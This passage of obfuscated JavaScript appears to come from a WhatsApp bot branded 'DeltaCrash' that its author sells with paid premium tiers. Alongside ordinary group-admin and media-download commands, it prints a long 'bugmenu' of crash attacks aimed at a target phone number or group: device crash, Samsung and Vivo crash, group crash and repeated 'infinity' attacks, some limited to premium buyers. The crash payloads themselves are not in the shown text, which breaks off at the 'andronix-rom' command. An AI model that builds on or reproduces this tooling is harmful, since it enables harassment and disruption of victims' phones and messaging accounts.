          'title': '𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒'
        }
      }
    };
    const _0x26351c = {
      'key': {
        'participant': "0@s.whatsapp.net",
        ...(_0xd62657 ? {
          'remoteJid': "status@broadcast"
        } : {})
      },
      'message': {
        'contactMessage': {
          'displayName': '' + namaowner,
          'vcard': "BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=628189850142:+62 813-8985-0142\nitem1.X-ABLabel:Ponsel\nEND:VCARD",
          'sendEphemeral': true
        }
      }
    };
    async function _0x5d98d9(_0x2916f9) {
      const _0x2f2d99 = {
        'contextInfo': {
          'externalAdReply': {
            'showAdAttribution': false,
            'title': "𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒",
            'body': '',
            'thumbnailUrl': "https://telegra.ph/file/14421142a4e58f13a29f2.jpg",
            'sourceUrl': '',
            'mediaType': 0x1,
            'renderLargerThumbnail': false
          }
        },
        'text': _0x2916f9
      };
      return _0x38dbed.sendMessage(_0x44bc2a.chat, _0x2f2d99, {
        'quoted': _0x26351c
      });
    }
    ;
    let _0x479205;
    try {
      _0x479205 = await _0x38dbed.profilePictureUrl(_0x44bc2a.sender, "image");
    } catch (_0x266ae0) {
      _0x479205 = "https://telegra.ph/file/14421142a4e58f13a29f2.jpg";
    }
    if (global.owneroff && !_0x3b6f08) {
      if (!_0x514477 && !_0x215af5) {
        let _0x211102 = "*hallo Kak* @" + _0x44bc2a.sender.split('@')[0x0];
        return _0x38dbed.sendMessage(_0x44bc2a.chat, {
          'text': '' + _0x211102,
          'contextInfo': {
            'mentionedJid': [_0x44bc2a.sender],
            'externalAdReply': {
              'showAdAttribution': true,
              'thumbnail': fs.readFileSync('./deltanime/kakgem.jpg'),
              'renderLargerThumbnail': false,
              'title': "｢ DELTACRASH ｣",
              'mediaUrl': linkgc,
              'sourceUrl': linkyt,
              'previewType': "PHOTO"
            }
          }
        }, {
          'quoted': null
        });
      }
    }
    if (_0x1e8373.includes(_0x44bc2a.chat)) {
      if (!_0x4471f3) {
        return;
      }
      if (!_0x2a38b6 && !_0x215af5 && !_0x44bc2a.fromMe) {
        var _0x1f009b = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi;
        if (_0x1f009b.test(_0x44bc2a.text)) {
          var _0x38661f = "https://chat.whatsapp.com/" + (await _0x38dbed.groupInviteCode(_0x44bc2a.chat));
          var _0x4d1114 = new RegExp(_0x38661f, 'i');
          var _0x2582bb = _0x4d1114.test(_0x44bc2a.text);
          if (_0x2582bb) {
            return;
          }
          let _0x1c4e8e = _0x44bc2a.key.participant;
          let _0x1ee261 = _0x44bc2a.key.id;
          await _0x38dbed.sendMessage(_0x44bc2a.chat, {
            'text': '@' + _0x44bc2a.sender.split('@')[0x0] + " Maaf Kamu Akan Di kick Dari Grup Ini Karna Admin Bot Menyalakan Fitur *Antilink* Grup Lain!",
            'contextInfo': {
              'mentionedJid': [_0x44bc2a.sender],
              'externalAdReply': {
                'thumbnail': fs.readFileSync('./deltanime/kakgem.jpg'),
                'title': "｢ LINK GRUP DETECTED ｣",
                'previewType': "PHOTO"
              }
            }
          }, {
            'quoted': _0x44bc2a
          });
          await _0x38dbed.sendMessage(_0x44bc2a.chat, {
            'delete': {
              'remoteJid': _0x44bc2a.chat,
              'fromMe': false,
              'id': _0x1ee261,
              'participant': _0x1c4e8e
            }
          });
          await _0x38dbed.groupParticipantsUpdate(_0x44bc2a.chat, [_0x44bc2a.sender], "remove");
        }
      }
    }
    if (_0x1fb1e0.includes(_0x44bc2a.chat)) {
      if (!_0x4471f3) {
        return;
      }
      if (!_0x2a38b6 && !_0x215af5 && !_0x44bc2a.fromMe) {
        var _0x1f009b = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi;
        if (_0x1f009b.test(_0x44bc2a.text)) {
          var _0x38661f = "https://chat.whatsapp.com/" + (await _0x38dbed.groupInviteCode(_0x44bc2a.chat));
          var _0x4d1114 = new RegExp(_0x38661f, 'i');
          var _0x2582bb = _0x4d1114.test(_0x44bc2a.text);
          if (_0x2582bb) {
            return;
          }
          let _0x576a03 = _0x44bc2a.key.participant;
          let _0x5ba0e8 = _0x44bc2a.key.id;
          await _0x38dbed.sendMessage(_0x44bc2a.chat, {
            'text': '@' + _0x44bc2a.sender.split('@')[0x0] + " Maaf Pesan Kamu Saya Hapus Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!",
            'contextInfo': {
              'mentionedJid': [_0x44bc2a.sender],
              'externalAdReply': {
                'thumbnail': fs.readFileSync("./deltanime/pukimak.jpg"),
                'title': "｢ LINK GRUP DETECTED ｣",
                'previewType': 'PHOTO'
              }
            }
          }, {
            'quoted': _0x44bc2a
          });
          await _0x38dbed.sendMessage(_0x44bc2a.chat, {
            'delete': {
              'remoteJid': _0x44bc2a.chat,
              'fromMe': false,
              'id': _0x5ba0e8,
              'participant': _0x576a03
            }
          });
        }
      }
    }
    switch (_0x19c9fe) {
      case "menu":
        const _0x1d3cf9 = " [ creator : delta tech ]\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n  ⩽ `D E L T A X C R A S H-M A K E R` ⩾\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n╒─⩽ `MAIN MENU` ⩾\n│彡 " + _0x1eabdf + "self\n│彡 " + _0x1eabdf + "public\n│彡 " + _0x1eabdf + "kick\n│彡 " + _0x1eabdf + "hidetag\n│彡 " + _0x1eabdf + "addowner\n│彡 " + _0x1eabdf + "delowner\n│彡 " + _0x1eabdf + "addprem\n│彡 " + _0x1eabdf + "delprem\n│彡 " + _0x1eabdf + "pinterest\n│彡 " + _0x1eabdf + "tiktok\n│彡 " + _0x1eabdf + "bugmenu\n╘───────────────┈⳹\n\n╒─⩽ 「 `ZONA FUCKING BUG` 」 \n│彡 " + _0x1eabdf + "xnxx 62xxx\n│彡 " + _0x1eabdf + "brazzers 62xxx\n│彡 " + _0x1eabdf + "hentai 62xxx\n│彡 " + _0x1eabdf + "yandex 62xxx\n│彡 " + _0x1eabdf + "xvideos 62xxx\n│彡 " + _0x1eabdf + "japan 62xxx\n│彡 " + _0x1eabdf + "hardcore 62xxx\n│彡 " + _0x1eabdf + "metaverse 62xxx\n╘───────────────┈⳹\n\n╒─⩽ `Credit YouTube : Delta Tech` ⩾\n╘────────────────────────────┈⳹\n";
        _0x38dbed.sendMessage(_0x44bc2a.chat, {
          'image': {
            'url': "./Delta1.jpg"
          },
          'caption': _0x1d3cf9
        }, {
          'quoted': _0x44bc2a
        });
        break;
      case "bugmenu":
        const _0x14f73e = "\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n  ⩽ `D E L T A X C R A S H-M A K E R` ⩾\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n╒─⩽ `RANDOM BUG HARD` ⩾\n│彡 " + _0x1eabdf + "delta1 62xxx\n│彡 " + _0x1eabdf + "sys 62xxx, jumlah\n│彡 " + _0x1eabdf + "dark 62xxx\n│彡 " + _0x1eabdf + "satan 62xxxx\n│彡 " + _0x1eabdf + "satanic 62xxx|jumlah\n│彡 " + _0x1eabdf + "luchifer 62xxx\n│彡 " + _0x1eabdf + "crash-total 62xxx\n│彡 " + _0x1eabdf + "maker 62xxx\n│彡 " + _0x1eabdf + "unlimited-bug 62xxx\n│彡 " + _0x1eabdf + "chace-bug 62xxx\n│彡 " + _0x1eabdf + "phone-crash 62xxx\n│彡 " + _0x1eabdf + "notif-crash 62xxx\n│彡 " + _0x1eabdf + "lockbit *<reply message>*\n╘───────────────┈⳹\n\n╒─⩽ `MAIN WAR BUG` ⩾\n│彡 " + _0x1eabdf + "internal-crash 62xxx, jumlah\n│彡 " + _0x1eabdf + "internal-ui 62xxx, jumlah\n│彡 " + _0x1eabdf + "crash-myinter 62xxx, jumlah\n│彡 " + _0x1eabdf + "satan-internal 62xxx, jumlah\n│彡 " + _0x1eabdf + "satan-external 62xxx, jumlah\n│彡 " + _0x1eabdf + "engine-crash 62xxx, jumlah\n│彡 " + _0x1eabdf + "engine-internal 62xxx, jumlah\n│彡 " + _0x1eabdf + "engine-external 62xxx, jumlah\n│彡 " + _0x1eabdf + "engine-ui 62xxx, jumlah\n│彡 " + _0x1eabdf + "bug-engine 62xxx, jumlah\n│彡 " + _0x1eabdf + "bug-quoted 62xxx\n│彡 " + _0x1eabdf + "internal-quoted 62xxx\n│彡 " + _0x1eabdf + "external-quoted 62xxx\n╘───────────────┈⳹\n\n╒─⩽ `BUG GROUP HARDCORE` ⩾\n│彡 " + _0x1eabdf + "bug-button link group\n│彡 " + _0x1eabdf + "bug-worm link group\n│彡 " + _0x1eabdf + "button-internal link group\n│彡 " + _0x1eabdf + "button-external link group\n│彡 " + _0x1eabdf + "ui-grup link group\n│彡 " + _0x1eabdf + "bug-hole 120###@g.us\n│彡 " + _0x1eabdf + "enemygroup 120###@g.us\n│彡 " + _0x1eabdf + "internal-group 120###@g.us\n│彡 " + _0x1eabdf + "external-group 120###@g.us\n╘───────────────┈⳹\n\n╒─⩽ `BUG EMOTICON HARDCORE` ⩾\n│彡 " + _0x1eabdf + "🔥 62xxx\n│彡 " + _0x1eabdf + "🌷 62xxx\n│彡 " + _0x1eabdf + "💥 62xxx\n│彡 " + _0x1eabdf + "🌹 62xxx\n│彡 " + _0x1eabdf + "⭐ 62xxx\n│彡 " + _0x1eabdf + "⚡ 62xxx\n│彡 " + _0x1eabdf + "😈 62xxx\n│彡 " + _0x1eabdf + "💀 62xxx\n│彡 " + _0x1eabdf + "🗿 62xxx\n│彡 " + _0x1eabdf + "🤯 62xxx\n╘───────────────┈⳹\n\n╒─⩽ `ZONA HARDCORE BUG` ⩾\n│彡 " + _0x1eabdf + "hardcore-cover 62xxx, jumlah\n│彡 " + _0x1eabdf + "hardcore-geek 62xxx, jumlah\n│彡 " + _0x1eabdf + "hardcore-evos 62xxx, jumlah\n│彡 " + _0x1eabdf + "hardcore-lock 62xxx, jumlah\n│彡 " + _0x1eabdf + "hardcore-dark 62xxx, jumlah\n│彡 " + _0x1eabdf + "hardcore-lcd 62xxx, jumlah\n│彡 " + _0x1eabdf + "hardcore-maker 62xxx, jumlah\n╘───────────────┈⳹\n\n╒─⩽ `ZONA NOT FOUND BUG` ⩾\n│彡 " + _0x1eabdf + "blank 62xxx, jumlah\n│彡 " + _0x1eabdf + "blank-ui 62xxx, jumlah\n│彡 " + _0x1eabdf + "blank-dark, jumlah\n│彡 " + _0x1eabdf + "eror-bug, jumlah\n│彡 " + _0x1eabdf + "walking-bug 62xxx, jumlah\n╘───────────────┈⳹\n\n╒─⩽ `SAMSUNG DEVICE CRASH` ⩾\n│彡 " + _0x1eabdf + "samsung-bug 62xxx\n│彡 " + _0x1eabdf + "samsung-ui 62xxx\n│彡 " + _0x1eabdf + "samsung-internal 62xxx\n│彡 " + _0x1eabdf + "samsung-external 62xxx\n│彡 " + _0x1eabdf + "samsung-reboot 62xxx\n│彡 " + _0x1eabdf + "samsung-crash 62xxx\n╘───────────────┈⳹\n\n╒─⩽ `ZONA LISTENING CORE BUG` ⩾\n│彡 " + _0x1eabdf + "buglist-ui 62xxx, jumlah\n│彡 " + _0x1eabdf + "buglist-crash 62xxx, jumlah\n│彡 " + _0x1eabdf + "buglist-external 62xxx, jumlah\n│彡 " + _0x1eabdf + "buglist-internal 62xxx, jumlah\n│彡 " + _0x1eabdf + "buglist-engine 62xxx, jumlah\n╘───────────────┈⳹\n\n╒─⩽ `ZONA INFINITY BUG` ⩾\n│彡 " + _0x1eabdf + "infinity-war 62xxx\n│彡 " + _0x1eabdf + "infinity-unlimit 62xxx\n│彡 " + _0x1eabdf + "infinity-good 62xxx|timer\n│彡 " + _0x1eabdf + "infinity-warcrash 62xxx|timer\n╘───────────────┈⳹\n\n╒─⩽ `LORAZALORA OLD BUG` ⩾\n│彡 " + _0x1eabdf + "lorazalora-crash 62xx\n│彡 " + _0x1eabdf + "lorazalora-infinity 62xx\n│彡 " + _0x1eabdf + "lorazalora-un 62xxx\n│彡 " + _0x1eabdf + "lorazalora-pers 62xx\n│彡 " + _0x1eabdf + "lorazalora-ui 62xxx\n╘───────────────┈⳹\n\n╒─⩽ `BUG OFFICIAL DELTACRASH` ⩾\n│彡 " + _0x1eabdf + "deltacrsah-mekdi 62xxx, jumlah\n│彡 " + _0x1eabdf + "deltacrsah-layer 62xxx, jumlah\n│彡 " + _0x1eabdf + "deltacrsah-forme 62xxx, jumlah\n│彡 " + _0x1eabdf + "deltacrsah-engine 62xxx, jumlah\n│彡 " + _0x1eabdf + "deltaxcrash-external 62xxx, jumlah\n│彡 " + _0x1eabdf + "deltaxcrash-internal 62xxx, jumlah\n╘───────────────┈⳹\n\n╒─⩽ `ZONA NETWORKING AND WIRLES BUG` ⩾\n│彡 " + _0x1eabdf + "network-just 62xxx\n│彡 " + _0x1eabdf + "network-fels 62xxx\n│彡 " + _0x1eabdf + "network-wolf 62xxx\n│彡 " + _0x1eabdf + "network-five 62xxx\n│彡 " + _0x1eabdf + "network-xns 62xxx\n│彡 " + _0x1eabdf + "network-reels 62xxx\n│彡 " + _0x1eabdf + "network-axis 62xxx\n│彡 " + _0x1eabdf + "network-kominfo 62xxx\n│彡 " + _0x1eabdf + "network-xl 62xxx\n│彡 " + _0x1eabdf + "network-one 62xxx\n│彡 " + _0x1eabdf + "network-crash 62xxx\n│彡 " + _0x1eabdf + "network-close 62xxx\n│彡 " + _0x1eabdf + "wirles 62xxx \n╘───────────────┈⳹\n\n╒─⩽ `ZONA CRASHXV BUG` ⩾\n│彡 " + _0x1eabdf + "crashxv-bug 62xxx, jumlah\n│彡 " + _0x1eabdf + "crashxv-strong 62xxx, jumlah\n│彡 " + _0x1eabdf + "crashxv-wirles 62xxx, jumlah\n│彡 " + _0x1eabdf + "crashxv-system 62xxx, jumlah\n│彡 " + _0x1eabdf + "crashxv-sql 62xxx, jumlah\n│彡 " + _0x1eabdf + "crashxv-ui 62xxx, jumlah\n│彡 " + _0x1eabdf + "crashxv-internal 62xxx, jumlah\n│彡 " + _0x1eabdf + "crashxv-external 62xxx, jumlah\n╘───────────────┈⳹\n\n╒─⩽ `ZONA ANDRONIX BUG` ⩾\n│彡 " + _0x1eabdf + "andronix 62xxx\n│彡 " + _0x1eabdf + "andronix-rom 62xxx, jumlah\n│彡 " + _0x1eabdf + "andronix-fc 62xxx\n│彡 " + _0x1eabdf + "andronix-xnxx 62xxx\n│彡 " + _0x1eabdf + "andronix-xyz 62xxx\n│彡 " + _0x1eabdf + "andronix-war 62xxx\n│彡 " + _0x1eabdf + "andronix-vrs 62xxx\n╘───────────────┈⳹\n\n╒─⩽ `ZONA DEVICE VIVO BUG` ⩾\n│彡 " + _0x1eabdf + "vivo-id 62xxx, jumlah\n│彡 " + _0x1eabdf + "vivo-bug 62xxx, jumlah\n│彡 " + _0x1eabdf + "vivo-internal 62xxx, jumlah\n│彡 " + _0x1eabdf + "vivo-external 62xxx, jumlah\n│彡 " + _0x1eabdf + "vivo-ui 62xxx, jumlah\n│彡 " + _0x1eabdf + "vivo-uicrash 62xxx, jumlah\n│彡 " + _0x1eabdf + "vivo-system 62xxx, jumlah\n│彡 " + _0x1eabdf + "vivo-engine 62xxx, jumlah\n│彡 " + _0x1eabdf + "vivo-wtf 62xxx \n│彡 " + _0x1eabdf + "vivo-list 62xxx|jumlah\n╘───────────────┈⳹\n\n╒─⩽ `Credit YouTube : Delta Tech` ⩾\n╘────────────────────────────┈⳹\n";
        _0x38dbed.sendMessage(_0x44bc2a.chat, {
          'image': {
            'url': "./DeltaNew/deltaFiveDotOne.jpg"
          },
          'caption': _0x14f73e
        }, {
          'quoted': _0x44bc2a
        });
        break;
      case "addowner":
      case "addown":
        {
          if (!_0x215af5) {
            return _0x5d98d9(msg.owner);
          }
          if (_0x44bc2a.quoted || _0x1b3c99) {
            let _0x3f365d = _0x44bc2a.mentionedJid[0x0] ? _0x44bc2a.mentionedJid[0x0] : _0x1b3c99 ? _0x1b3c99.replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x44bc2a.quoted ? _0x44bc2a.quoted.sender : '';
            if (_0x18499e.includes(_0x3f365d) || _0x3f365d == global.owner) {
              return _0x5d98d9("Nomor " + _0x3f365d.split('@')[0x0] + " Sudah terdaftar sebagai Owner");
            }
            if (_0x3f365d == _0xd62657) {
              return _0x5d98d9("kontol !");
            }
            let _0x1ba708 = await _0x38dbed.onWhatsApp('' + _0x3f365d.split('@')[0x0]);
            if (_0x1ba708.length < 0x1) {
              return _0x5d98d9("Nomor " + _0x3f365d.split('@')[0x0] + " Tidak Terdaftar Di WhatsApp");
            }
            await _0x18499e.push(_0x3f365d);
            await fs.writeFileSync("./all/database/owner.json", JSON.stringify(_0x18499e, null, 0x2));
            _0x5d98d9("*Berhasil Menambah Owner 彡*\nanjay " + _0x3f365d.split('@')[0x0] + " sekarang jadi owner");
          } else {
            _0x5d98d9("\n*Contoh Penggunaan :*\nketik *" + _0x50dea1 + "* " + "silahkan @tag nomornya" + "\n");
          }
        }
        break;
      case 'delowner':
      case "delown":
        {
          if (!_0x215af5) {
            return _0x5d98d9(msg.owner);
          }
          if (_0x44bc2a.quoted || _0x1b3c99) {
            if (_0x1b3c99 == "all") {
              await fs.writeFileSync("./all/database/owner.json", '[]');
              return _0x5d98d9("*</> Berhasil Menghapus Semua Owner 彡*");
            }
            let _0x42ed2b = _0x44bc2a.mentionedJid[0x0] ? _0x44bc2a.mentionedJid[0x0] : _0x1b3c99 ? _0x1b3c99.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : _0x44bc2a.quoted ? _0x44bc2a.quoted.sender : '';
            if (!_0x18499e.includes(_0x42ed2b) || _0x42ed2b == global.owner) {
              return _0x5d98d9("Nomor " + _0x42ed2b.split('@')[0x0] + " Tidak Ada Di Database Owner");
            }
            if (_0x42ed2b == _0xd62657) {
              return _0x5d98d9("Tidak Bisa Menghapus Nomor Bot!");
            }
            let _0x44629f = _0x18499e.indexOf(_0x42ed2b);
            await _0x18499e.splice(_0x44629f, 0x1);
            await fs.writeFileSync("./all/database/owner.json", JSON.stringify(_0x18499e, null, 0x2));
            _0x5d98d9("*Berhasil Menghapus Owner 彡*\n</> Nomor " + _0x42ed2b.split('@')[0x0] + " Berhasil Dihapus Dari Database");
          } else {
            _0x5d98d9("\n*Contoh Penggunaan :*\nketik *" + _0x50dea1 + "* " + "silahkan @tag orangnya" + "\n");
          }
        }
        break;
      case "addprem":
      case 'addpremium':
        {
          if (!_0x215af5) {
            return _0x5d98d9(msg.owner);
          }
          if (_0x44bc2a.quoted || _0x1b3c99) {
            let _0x4ec525 = _0x44bc2a.mentionedJid[0x0] ? _0x44bc2a.mentionedJid[0x0] : _0x1b3c99 ? _0x1b3c99.replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x44bc2a.quoted ? _0x44bc2a.quoted.sender : '';
            if (_0x1572e5.includes(_0x4ec525)) {
              return _0x5d98d9("*Gagal Menambah User Premium!*\n" + _0x4ec525.split('@')[0x0] + " Dia Sudah Terdaftar di Database *User Premium*");
            }
            await _0x1572e5.push(_0x4ec525);
            await fs.writeFileSync("./all/database/premium.json", JSON.stringify(_0x1572e5));
            _0x5d98d9("*Berhasil Menambah Premium 彡*\n" + _0x4ec525.split('@')[0x0] + " Sekarang Terdaftar Di Database *User Premium*");
          } else {
            return _0x5d98d9("\n*Contoh Penggunaan :*\nketik *" + _0x50dea1 + "* " + "@tag/62838XXX" + "\n");
          }
        }
        break;
      case "delprem":
      case 'delpremium':
        {
          if (!_0x215af5) {
            return _0x5d98d9(msg.owner);
          }
          if (_0x44bc2a.quoted || _0x1b3c99) {
            let _0x2d1359 = _0x44bc2a.mentionedJid[0x0] ? _0x44bc2a.mentionedJid[0x0] : _0x1b3c99 ? _0x1b3c99.replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x44bc2a.quoted ? _0x44bc2a.quoted.sender : '';
            if (!_0x1572e5.includes(_0x2d1359)) {
              return _0x5d98d9("*Gagal Menghapus User Premium!*\n" + _0x2d1359.split('@')[0x0] + " Tidak Terdaftar Di Database *User Premium*");
            }
            let _0x3d3ea8 = _0x1572e5.indexOf(_0x2d1359);
            await _0x1572e5.splice(_0x3d3ea8, 0x1);
            await fs.writeFileSync("./all/database/premium.json", JSON.stringify(_0x1572e5));
            _0x5d98d9("*Berhasil Menghapus Premium 彡*\n" + _0x2d1359.split('@')[0x0] + " Sekarang Terhapus Dari Database *User Premium*");
          } else {
            return _0x5d98d9("\n*Contoh Penggunaan :*\nketik *" + _0x50dea1 + "* " + "silakan @tag orangnya " + "\n");
          }
        }
        break;
      case "public":
        {
          if (!_0x215af5) {
            return _0x5d98d9(msg.owner);
          }
          _0x38dbed["public"] = true;
          _0x5d98d9("*Berhasil Mengganti Mode 彡*\nMode Bot Beralih Ke *Public*");
        }
        break;
      case "self":
        {
          if (!_0x215af5) {
            return _0x5d98d9(msg.owner);
          }
          _0x38dbed["public"] = false;
          _0x5d98d9("*Berhasil Mengganti Mode 彡*\nMode Bot Beralih Ke *Self*");
        }
        break;
      case "pinterest":
      case 'pin':
        {
          if (!_0x1b3c99) {
            return _0x5d98d9("\n*Contoh Penggunaan :*\nketik *" + _0x50dea1 + "* " + 'tobrut' + "\n");
          }
          _0x5d98d9(global.msg.wait);
          let _0x51ae06 = await _0x4a6b16(_0x1b3c99);
          if (_0x51ae06.length == 0x0) {
            return _0x5d98d9("_</> maaf foto yang kamu cari tidak ada_");
          }
          if (_0x51ae06.length < 0x5) {
            anuan = _0x51ae06;
          } else {
            anuan = _0x51ae06.slice(0x0, 0x5);
          }
          let _0xa03e58 = new Array();
          for (let _0x20a996 of anuan) {
            let _0x3cbe0a = await prepareWAMessageMedia({
              'image': await fetch('' + _0x20a996)
            }, {
              'upload': _0x38dbed.waUploadToServer
            });
            _0xa03e58.push({
              'header': proto.Message.InteractiveMessage.Header.fromObject({
                'hasMediaAttachment': true,
                ..._0x3cbe0a
              }),
              'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                'buttons': [{
                  'name': "cta_url",
                  'buttonParamsJson': "{\"display_text\":\"tautan\",\"url\":\"" + _0x20a996 + "\",\"merchant_url\":\"https://www.google.com\"}"
                }]
              })
            });
          }
          const _0x12b14f = await generateWAMessageFromContent(_0x44bc2a.chat, {
            'viewOnceMessage': {
              'message': {
                'messageContextInfo': {
                  'deviceListMetadata': {},
                  'deviceListMetadataVersion': 0x2
                },
                'interactiveMessage': proto.Message.InteractiveMessage.fromObject({
                  'body': proto.Message.InteractiveMessage.Body.fromObject({
                    'text': "_</> berikut hasil pencarian foto kamu_"
                  }),
                  'carouselMessage': proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                    'cards': _0xa03e58
                  })
                })
              }
            }
          }, {
            'userJid': _0x44bc2a.sender,
            'quoted': _0x44bc2a
          });
          await _0x38dbed.relayMessage(_0x44bc2a.chat, _0x12b14f.message, {
            'messageId': _0x12b14f.key.id
          });
        }
        break;
      case "tiktok":
      case 'tt':
        {
          if (!_0x1b3c99) {
            return _0x5d98d9("\n*Contoh Penggunaan :*\nketik *" + _0x50dea1 + "* " + "linknya" + "\n");
          }
          if (!/tiktok.com/.test(_0x1b3c99)) {
            return _0x5d98d9("_</> link not found bro_!");
          }
          _0x5d98d9(msg.wait);
          await api.tiktok(_0x1b3c99).then(async _0x241693 => {
            if (_0x241693.result.duration == 0x0) {
              for (let _0x412fea of _0x241693.result.images) {
                _0x38dbed.sendMessage(_0x44bc2a.chat, {
                  'image': {
                    'url': '' + _0x412fea
                  },
                  'caption': "*</> Berhasil di download by - Deltacrash 彡*"
                }, {
                  'quoted': _0x44bc2a
                });
              }
            } else {
              await _0x38dbed.sendMessage(_0x44bc2a.chat, {
                'video': {
                  'url': _0x241693.result.play
                },
                'mimetype': 'video/mp4',
                'caption': "*</> Berhasil di download by - Deltacrash 彡*"
              }, {
                'quoted': _0x44bc2a
              });
            }
          })["catch"](_0x2fda18 => _0x5d98d9('' + _0x2fda18));
        }
        break;
      case "autoread":
        {
          if (!_0x215af5) {
            return _0x5d98d9(msg.owner);
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("\n*Contoh Penggunaan :*\nketik *" + _0x50dea1 + "* " + "on/off\nKetik *.statusbot* Untuk Melihat Status Setting Bot" + "\n");
          }
          if (_0x1b3c99.toLowerCase() == 'on') {
            if (autoread) {
              return _0x5d98d9("*Autoread* Sudah Aktif!\nKetik *.statusbot* Untuk Melihat Status Setting Bot");
            }
            autoread = true;
            _0x5d98d9("*Berhasil Menyalakan Autoread 彡*\nKetik *.statusbot* Untuk Melihat Status Setting Bot");
          } else {
            if (_0x1b3c99.toLowerCase() == "off") {
              if (!autoread) {
                return _0x5d98d9("*Autoread* Sudah Tidak Aktif!\nKetik *.statusbot* Untuk Melihat Status Setting Bot");
              }
              autoread = false;
              _0x5d98d9("*Berhasil Mematikan Autoread 彡*\nKetik *.statusbot* Untuk Melihat Status Setting Bot");
            } else {
              return _0x5d98d9("\n*Contoh Penggunaan :*\nketik *" + _0x50dea1 + "* " + "on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot" + "\n");
            }
          }
        }
        break;
      case "open":
        {
          if (!_0x514477) {
            return _0x5d98d9(msg.group);
          }
          if (!_0x4471f3) {
            return _0x5d98d9(msg.adminbot);
          }
          if (!_0x2a38b6 && !_0x215af5) {
            return _0x5d98d9(msg.admin);
          }
          await _0x38dbed.groupSettingUpdate(_0x44bc2a.chat, 'not_announcement');
          _0x5d98d9("*Berhasil Mengganti Setelan Grup 彡*\nMenjadi Anggota Dapat Mengirim Pesan");
        }
        break;
      case "close":
        {
          if (!_0x514477) {
            return _0x5d98d9(msg.group);
          }
          if (!_0x4471f3) {
            return _0x5d98d9(msg.adminbot);
          }
          if (!_0x2a38b6 && !_0x215af5) {
            return _0x5d98d9(msg.admin);
          }
          await _0x38dbed.groupSettingUpdate(_0x44bc2a.chat, "announcement");
          _0x5d98d9("*Berhasil Mengganti Setelan Grup 彡*\nMenjadi Hanya Admin Yang Dapat Mengirim Pesan");
        }
        break;
      case 'del':
      case "delete":
        {
          if (_0x514477) {
            if (!_0x215af5 && !_0x2a38b6) {
              return _0x5d98d9(msg.admin);
            }
            if (!_0x44bc2a.quoted) {
              return _0x5d98d9("</> Reply Pesan Yang Ingin Di Hapus");
            }
            if (_0x44bc2a.quoted.sender == _0xd62657) {
              _0x38dbed.sendMessage(_0x44bc2a.chat, {
                'delete': {
                  'remoteJid': _0x44bc2a.chat,
                  'fromMe': true,
                  'id': _0x44bc2a.quoted.id,
                  'participant': _0x44bc2a.quoted.sender
                }
              });
            } else {
              if (!_0x4471f3) {
                return _0x5d98d9(msg.adminbot);
              }
              _0x38dbed.sendMessage(_0x44bc2a.chat, {
                'delete': {
                  'remoteJid': _0x44bc2a.chat,
                  'fromMe': false,
                  'id': _0x44bc2a.quoted.id,
                  'participant': _0x44bc2a.quoted.sender
                }
              });
            }
          } else {
            if (!_0x215af5) {
              return _0x5d98d9(msg.owner);
            }
            if (!_0x44bc2a.quoted) {
              return _0x5d98d9("</> Reply Pesan Yang Ingin Di Hapus");
            }
            _0x38dbed.sendMessage(_0x44bc2a.chat, {
              'delete': {
                'remoteJid': _0x44bc2a.chat,
                'fromMe': false,
                'id': _0x44bc2a.quoted.id,
                'participant': _0x44bc2a.quoted.sender
              }
            });
          }
        }
        break;
      case "kik":
      case "kick":
        {
          if (!_0x514477) {
            return _0x5d98d9(msg.group);
          }
          if (!_0x4471f3) {
            return _0x5d98d9(msg.adminbot);
          }
          if (!_0x2a38b6 && !_0x215af5) {
            return _0x5d98d9(msg.admin);
          }
          if (_0x1b3c99 || _0x44bc2a.quoted) {
            let _0x25bce6 = _0x44bc2a.mentionedJid[0x0] ? _0x44bc2a.mentionedJid[0x0] : _0x44bc2a.quoted ? _0x44bc2a.quoted.sender : _0x1b3c99.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
            await _0x38dbed.groupParticipantsUpdate(_0x44bc2a.chat, [_0x25bce6], 'remove').then(_0x1fc7d4 => _0x38dbed.sendMessage(_0x44bc2a.chat, {
              'text': "</> Oke Berhasil Mengeluarkan @" + _0x25bce6.split('@')[0x0] + " Dari Grup",
              'mentions': ['' + _0x25bce6]
            }, {
              'quoted': _0x44bc2a
            }))["catch"](_0x21940f => _0x5d98d9(_0x21940f.toString()));
          } else {
            return _0x5d98d9("\n*Contoh Penggunaan :*\nketik *" + _0x50dea1 + "* " + "silahkan masukan nomornya atau @tag" + "\n");
          }
        }
        break;
      case "hidetag":
      case 'z':
      case 'h':
        {
          if (!_0x514477) {
            return _0x5d98d9(msg.group);
          }
          if (!_0x2a38b6 && !_0x215af5) {
            return _0x5d98d9(msg.admin);
          }
          if (!_0x44bc2a.quoted && !_0x1b3c99) {
            return _0x5d98d9("\n*Contoh Penggunaan :*\nketik *" + _0x50dea1 + "* " + "mana teksnya anjir. atau replyteksnya" + "\n");
          }
          var _0x589adb = _0x44bc2a.quoted ? _0x44bc2a.quoted.text : _0x1b3c99;
          var _0x3a21db = await _0xefbffe.participants.map(_0x4ff546 => _0x4ff546.id);
          _0x38dbed.sendMessage(_0x44bc2a.chat, {
            'text': _0x589adb,
            'mentions': [..._0x3a21db]
          });
        }
        break;
      case 'andronix-rom':
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
